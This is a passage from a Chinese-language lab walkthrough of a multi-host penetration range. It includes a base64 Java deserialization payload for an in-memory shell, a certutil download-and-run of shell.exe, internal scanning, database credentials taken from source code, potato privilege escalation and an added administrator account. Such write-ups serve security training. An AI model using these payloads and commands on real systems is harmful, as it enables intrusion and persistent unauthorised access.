CQUFBQUt3QXVBQzhBQkFBSUFBQUFHZ0FHQUFBQVVRQVpBRklBSkFCVEFDc0FWUUF1QUZRQUx3QldBQWtBQUFBMEFBVUFHUUFTQUxvQUh3QURBQ1FBQndDN0FMd0FCQUFBQURBQUNnQUxBQUFBQUFBd0FCNEFId0FCQUFBQU1BQWdBQjhBQWdDOUFBQUFEQUFCQUNRQUJ3QzdBTDRBQkFBOUFBQUFCd0FDYmdjQUx3QUFDQUNaQUpvQUFnQUhBQUFCQUFBR0FBUUFBQUJxRXRHNEFOUk1LeExXQkwwQVgxa0RFaFpUdGdEWks3WUFhUVM5QUR4WkF5cFR0Z0M1d0FDaXdBQ2lzRTBTMjdnQTFFd3JFdDBEdlFCZnRnRFpBUU85QUR5MkFMbE9MYllBZmhMZkJMMEFYMWtERWhaVHRnRFpMUVM5QUR4WkF5cFR0Z0M1d0FDaXdBQ2lzQUFCQUFBQUtnQXJBQzhBQkFBSUFBQUFHZ0FHQUFBQVhBQUdBRjBBS3dCZUFDd0FYd0F5QUdBQVJRQmhBQWtBQUFBMEFBVUFCZ0FsQU1vQWtnQUJBRVVBSlFETEFCOEFBd0FzQUQ0QXpBQ1VBQUlBQUFCcUFNMEF6Z0FBQURJQU9BREtBSklBQVFDOUFBQUFGZ0FDQUFZQUpRREtBTThBQVFBeUFEZ0F5Z0RQQUFFQVBRQUFBQVlBQVdzSEFDOEFFZ0FBQUFvQUJBQ0VBSWdBaGdDS0FBa0FuUUNlQUFJQUJ3QUFBTlFBQkFBR0FBQUFQcnNBNjFtM0FQQk11d0R0V1NxM0FQTk51d0R2V1N5M0FQWk9FUUVBdkFnNkJDMFpCTFlBK2xrMkJac0FEeXNaQkFNVkJiWUEvcWYvNnl1MkFRS3dBQUFBQXdBSUFBQUFIZ0FIQUFBQVpnQUlBR2NBRVFCb0FCb0FhUUFoQUdzQUxRQnNBRGtBYmdBSkFBQUFQZ0FHQUFBQVBnRGdBSTRBQUFBSUFEWUE0UURpQUFFQUVRQXRBT01BNUFBQ0FCb0FKQURsQU9ZQUF3QWhBQjBBNXdDT0FBUUFLZ0FVQU9nQTZRQUZBRDBBQUFBY0FBTC9BQ0VBQlFjQW9nY0E2d2NBN1FjQTd3Y0FvZ0FBL0FBWEFRQVNBQUFBQkFBQkFCUUFJQUVEQVFRQUFnQUhBQUFBVndBREFBUUFBQUFMS3l5NEFRc3JMYllCRUxFQUFBQUNBQWdBQUFBS0FBSUFBQUJ5QUFvQWN3QUpBQUFBS2dBRUFBQUFDd0FLQUFzQUFBQUFBQXNCQlFBZkFBRUFBQUFMQVFZQXpnQUNBQUFBQ3dFSEFCOEFBd0FTQUFBQUJBQUJBQzhBQ0FCckFGRUFBZ0FIQUFBQVZ3QUNBQU1BQUFBUktpdTRBUXROTEFTMkFSVXNLcllCR2JBQUFBQUNBQWdBQUFBT0FBTUFBQUIyQUFZQWR3QUxBSGdBQ1FBQUFDQUFBd0FBQUJFQkVRQWZBQUFBQUFBUkFSSUF6Z0FCQUFZQUN3RVRBUlFBQWdBU0FBQUFCQUFCQUM4QUNBRUlBUWtBQWdBSEFBQUF4d0FEQUFRQUFBQW9LcllBZmswc3hnQVpMQ3UyQVNCT0xRUzJBUlV0c0U0c3RnRWpUYWYvNmJzQkcxa3J0d0VrdndBQkFBa0FGUUFXQVJzQUJBQUlBQUFBSmdBSkFBQUFmQUFGQUgwQUNRQi9BQThBZ0FBVUFJRUFGZ0NDQUJjQWd3QWNBSVFBSHdDR0FBa0FBQUEwQUFVQUR3QUhBUk1CRkFBREFCY0FCUUNUQVJ3QUF3QUFBQ2dCRVFBZkFBQUFBQUFvQVJJQXpnQUJBQVVBSXdDUkFKSUFBZ0M5QUFBQURBQUJBQVVBSXdDUkFNOEFBZ0E5QUFBQURRQUQvQUFGQndCZlVBY0JHd2dBRWdBQUFBUUFBUUViQUNnQVVBQlJBQUlBQndBQUFFSUFCQUFDQUFBQURpb3JBNzBBWHdPOUFEeTRBR1N3QUFBQUFnQUlBQUFBQmdBQkFBQUFpd0FKQUFBQUZnQUNBQUFBRGdFbEFCOEFBQUFBQUE0QkpnRE9BQUVBRWdBQUFBZ0FBd0NJQUlvQWhnQXBBRkFBWWdBQ0FBY0FBQUlYQUFNQUNRQUFBTW9xd1FCZm1RQUtLc0FBWDZjQUJ5cTJBSDQ2QkFFNkJSa0VPZ1laQmNjQVpCa0d4Z0JmTE1jQVF4a0d0Z0UyT2djRE5nZ1ZDQmtIdnFJQUxoa0hGUWd5dGdFNUs3WUJQSmtBR1JrSEZRZ3l0Z0ZBdnBvQURSa0hGUWd5T2dXbkFBbUVDQUduLzlDbkFBd1pCaXNzdGdDck9nV24vNms2QnhrR3RnRWpPZ2FuLzUwWkJjY0FETHNBaUZrcnR3RkJ2eGtGQkxZQXNTckJBRitaQUJvWkJRRXR0Z0M1c0RvSHV3RkRXUmtIdGdGR3R3Rkh2eGtGS2kyMkFMbXdPZ2U3QVVOWkdRZTJBVWEzQVVlL0FBTUFKUUJ5QUhVQWlBQ2NBS01BcEFDS0FMTUF1Z0M3QUlvQUF3QUlBQUFBYmdBYkFBQUFqd0FVQUpBQUZ3Q1NBQnNBa3dBbEFKVUFLUUNYQURBQW1BQTdBSmtBVmdDYUFGMEFtd0JnQUpnQVpnQ2VBR2tBbndCeUFLTUFkUUNoQUhjQW9nQitBS01BZ1FDbEFJWUFwZ0NQQUtnQWxRQ3BBSndBcXdDa0FLd0FwZ0N0QUxNQXNRQzdBTElBdlFDekFBa0FBQUI2QUF3QU13QXpBU2NBNlFBSUFEQUFOZ0VvQVNrQUJ3QjNBQWNBa3dFcUFBY0FwZ0FOQUpNQkt3QUhBTDBBRFFDVEFTc0FCd0FBQU1vQkVRQWZBQUFBQUFES0FTWUF6Z0FCQUFBQXlnRXNBUzBBQWdBQUFNb0JMZ0V2QUFNQUZBQzJBSkVBa2dBRUFCY0Fzd0V3QUpBQUJRQWJBSzhCTVFDU0FBWUFQUUFBQUM4QURnNURCd0JmL2dBSUJ3QmZCd0N0QndCZi9RQVhCd0V5QVN6NUFBVUNDRUlIQUlnTERWUUhBSW9PUndjQWlnQVNBQUFBQ0FBREFJZ0FoZ0NLQUFBPQcAWAwAWQBaDABbAFwHAF0BABBqYXZhL2xhbmcvT2JqZWN0BwBeDABfAGAMAGEAYgwAYwBkDABhAGUBAAh0TlBHR2ttYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAAVABYKABQAZgAhABMAFAAAAAAAAwABABUAFgACABcAAADLAAYABQAAAFkqtwBnEgK4AANMKxIEBL0ABVkDEgZTtgAHTSwEtgAIuAAJEgq2AAtOK7YADAMyOgQZBAS2AA0sGQQEvQAOWQO4AA9TtgAQBL0ADlkDLVO2ABHAAAW2ABJXsQAAAAIAGAAAACYACQAAABAABAARAAoAEgAaABMAHwAUACgAFQAwABYANgAXAFgAGAAZAAAANAAFAAAAWQAaABsAAAAKAE8AHAAdAAEAGgA/AB4AHwACACgAMQAgACEAAwAwACkAIgAjAAQAJAAAAAQAAQAlAAEAJgAnAAIAFwAAAD8AAAADAAAAAbEAAAACABgAAAAGAAEAAAAcABkAAAAgAAMAAAABABoAGwAAAAAAAQAoACkAAQAAAAEAKgArAAIAJAAAAAQAAQAsAAEAJgAtAAIAFwAAAEkAAAAEAAAAAbEAAAACABgAAAAGAAEAAAAhABkAAAAqAAQAAAABABoAGwAAAAAAAQAoACkAAQAAAAEALgAvAAIAAAABADAAMQADACQAAAAEAAEALAACADIAAAACADMAVgAAAAoAAQA+ADsAVQAJdXEAfgAYAAAA8sr+ur4AAAAxABMBAANGb28HAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACEZvby5qYXZhAQAUamF2YS9pby9TZXJpYWxpemFibGUHAAcBABBzZXJpYWxWZXJzaW9uVUlEAQABSgVx5mnuPG1HGAEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BAAMoKVYMAA4ADwoABAAQAQAEQ29kZQAhAAIABAABAAgAAQAaAAkACgABAA0AAAACAAsAAQABAA4ADwABABIAAAARAAEAAQAAAAUqtwARsQAAAAAAAQAFAAAAAgAGcHQAAsGQcHcBAHhzcgAiwarBocG2waHArsGswaHBrsGnwK7BicGuwbTBpcGnwaXBshLioKT3gYc4AgABSQAKwbbBocGswbXBpXhyACDBqsGhwbbBocCuwazBocGuwafArsGOwbXBrcGiwaXBsoaslR0LlOCLAgAAeHAAAAABeA==</span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.99</span>.<span class="number">157.159</span>:<span class="number">8080</span>/</span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/11.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/12.png"></p><p>这里注意，<strong>自定义的请求头要加上去</strong></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/13.png"></p><p>连接成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/14.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/15.png"></p><p>我们直接上线vshell</p><p>不出网，只能正向上线</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/16.png"></p><p>生成，上传到靶机中</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/17.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/19.png"></p><p>上线成功</p><p>能传东西，自然也可以用新出的cve-2025-32463打</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/20.png"></p><p>挂代理，fscan开扫</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webserver:/tmp<span class="comment"># ./fscan -h 172.16.53.0/24 -eh 172.16.53.30</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-07-08 17:58:24] [INFO] 暴力破解线程数: 1</span></span><br></pre></td></tr></table></figure><p>没扫出来什么东西</p><p>这是官方给出来的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span></span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure><p>ping一下试试</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.34.23</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">34.23</span> (<span class="number">172.16</span>.<span class="number">34.23</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.739</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.379</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.301</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">128</span> time=<span class="number">0.338</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">5</span> ttl=<span class="number">128</span> time=<span class="number">0.299</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">6</span> ttl=<span class="number">128</span> time=<span class="number">0.418</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">7</span> ttl=<span class="number">128</span> time=<span class="number">0.290</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">8</span> ttl=<span class="number">128</span> time=<span class="number">0.296</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">9</span> ttl=<span class="number">128</span> time=<span class="number">0.405</span> ms</span><br><span class="line"></span><br><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.36.21</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">36.21</span> (<span class="number">172.16</span>.<span class="number">36.21</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.585</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.326</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.316</span> ms</span><br><span class="line">^C</span><br><span class="line"><span class="literal">---</span> <span class="number">172.16</span>.<span class="number">36.21</span> ping statistics <span class="literal">---</span></span><br><span class="line"><span class="number">3</span> packets transmitted, <span class="number">3</span> received, <span class="number">0</span>% packet loss, time <span class="number">2069</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.316</span>/<span class="number">0.409</span>/<span class="number">0.585</span>/<span class="number">0.124</span> ms</span><br><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.34.5</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">34.5</span> (<span class="number">172.16</span>.<span class="number">34.5</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.353</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.278</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.294</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">128</span> time=<span class="number">0.286</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">5</span> ttl=<span class="number">128</span> time=<span class="number">0.274</span> ms</span><br><span class="line">^C</span><br><span class="line"><span class="literal">---</span> <span class="number">172.16</span>.<span class="number">34.5</span> ping statistics <span class="literal">---</span></span><br></pre></td></tr></table></figure><p>都能通，那么就一个个打吧</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mail<span class="literal">-svc</span>@webserver:/tmp<span class="variable">$</span> ./fscan <span class="literal">-h</span> <span class="number">172.16</span>.<span class="number">36.21</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 最终有效主机数量: 1</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:139</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:3306</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:135</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:53] [SUCCESS] 端口开放 172.16.36.21:445</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:59] [SUCCESS] 服务识别 172.16.36.21:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-07-08 18:11:59] [SUCCESS] 服务识别 172.16.36.21:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:06] [SUCCESS] 服务识别 172.16.36.21:3306 =&gt;  Banner:[!.#08S01Got packets out of order]</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] 服务识别 172.16.36.21:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 存活端口数量: 4</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [INFO] 加载的插件: findnet, ms17010, mysql, netbios, smb, smb2, smbghost</span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] NetBios 172.16.36.21    AOSELUAUTO\ASLITPC03          </span></span><br><span class="line"><span class="string">[2025-07-08 18:12:59] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.16.36.21</span></span><br><span class="line"><span class="string">主机名: ASLITPC03</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.16.36.21</span></span><br><span class="line"><span class="string">[2025-07-08 18:20:58] [SUCCESS] 扫描已完成: 7/7</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   </span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><h4 id="jar反编译"><a href="#jar反编译" class="headerlink" title="jar反编译"></a>jar反编译</h4><p>扫到有mysql端口，还有源码</p><p>我们代码审计获得mysql账号密码</p><p>前面用jd-gui没搜到</p><p>还是idea好用，比较清晰</p><p>具体打开步骤就不放了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/21.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.driver<span class="literal">-class-name</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql://<span class="number">172.16</span>.<span class="number">52.45</span>:<span class="number">3306</span>/maildb?characterEncoding=utf<span class="literal">-8</span>&amp;useUnicode=true&amp;serverTimezone=UTC</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=T%b8ds*l3v+B</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/22.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/23.png"></p><p>拿下</p><h4 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h4><p>那么我们先上线吧</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/24.png"></p><p>机器不出网，但是内网可以通讯，这里注意，存放的本地路径最好不要带空格（否则会影响运行）</p><p>还可以在navicat执行命令，会流畅一点，这里太卡了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">172.16</span>.<span class="number">53.30</span>:<span class="number">80</span>/shell.exe C:/Users/Public/shell.exe</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/25.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/26.png"></p><p>然后运行该程序</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/shell.exe</span><br></pre></td></tr></table></figure><p>就成功上线了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/27.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/28.png"></p><p>这里明明可以土豆提权的，但是就是不成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/29.png"></p><p>最后还是使用godpotato成功提权</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/30.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/31.png"></p><p>接下来 我们继续打其他的主机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   已拿下  mysql udf potato提权</span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\tmp&gt;net user Hundredsu qwer123! /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Public\tmp&gt;net localgroup administrators Hundredsu /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>rdp上去好操作些</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Hundredsu\Desktop\x64&gt;net time 